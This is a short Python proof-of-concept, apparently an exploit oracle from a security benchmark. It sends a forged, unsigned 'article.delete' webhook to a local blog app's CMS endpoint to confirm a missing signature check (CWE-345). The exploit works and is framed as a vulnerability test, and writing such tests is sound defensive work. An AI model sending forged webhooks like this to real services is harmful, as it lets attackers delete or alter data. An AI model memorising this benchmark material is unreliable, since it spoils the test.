"""PoC: Webhook signature bypass via missing header (CWE-345)."""
from mosaic.oracle.exploit import ExploitTest


class WebhookBypassExploit(ExploitTest):
    def __init__(self, base_url="http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self):
        return "gin_blog_webhook_signature_skip"

    def setup(self):
        pass

    def execute(self):
        evidence = []
        # Send a forged webhook without any signature header
        forged_payload = {
            "action": "article.delete",
            "article": {"id": 1, "title": "Forged deletion"}
        }
        resp = self.http_post(
            "/api/webhooks/cms",
            json=forged_payload,
            # Intentionally no X-CMS-Signature header
        )
        if resp.status_code == 200:
            body = resp.json()
            evidence.append(f"Unsigned webhook accepted: {body}")
            return True, "CWE-345 Webhook processed without signature verification. " + " | ".join(evidence)
        evidence.append(f"Unsigned webhook returned {resp.status_code}")
        return False, "Signature bypass not confirmed. " + " | ".join(evidence)
